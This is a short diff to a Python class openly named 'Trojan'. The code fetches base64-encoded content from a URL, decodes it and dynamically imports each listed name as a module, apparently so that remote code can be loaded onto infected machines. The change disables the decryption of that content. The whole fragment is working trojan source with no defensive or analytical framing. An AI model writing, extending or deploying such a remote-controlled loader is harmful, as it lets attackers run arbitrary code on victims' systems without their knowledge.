@@ -39,8 +39,8 @@ class Trojan:
         response = requests.get(url, headers=headers)
         if response.status_code == 200:
             decoded_content = base64.b64decode(response.json()["content"]).decode("utf-8")
-            decrypted_content = self.decrypt_content(decoded_content)
-            words = decrypted_content.split()
+            # decrypted_content = self.decrypt_content(decoded_content)
+            words = decoded_content.split()
             if words:
                 for word in words:
                     self.import_module(word.capitalize())
